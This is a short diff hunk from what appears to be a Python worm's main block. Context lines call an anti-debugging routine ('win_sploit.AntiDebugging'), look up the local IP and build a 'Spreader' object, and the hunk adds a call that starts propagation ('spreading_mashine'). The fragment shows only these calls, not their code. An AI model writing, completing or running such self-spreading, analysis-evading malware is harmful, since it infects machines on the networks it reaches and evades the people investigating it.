@@ -246,3 +246,4 @@ if __name__ == '__main__':
     win_sploit.AntiDebugging()
     ip = Spreader.get_local_ip()
     spread = Spreader(ip)
+    Spreader.spreading_mashine()
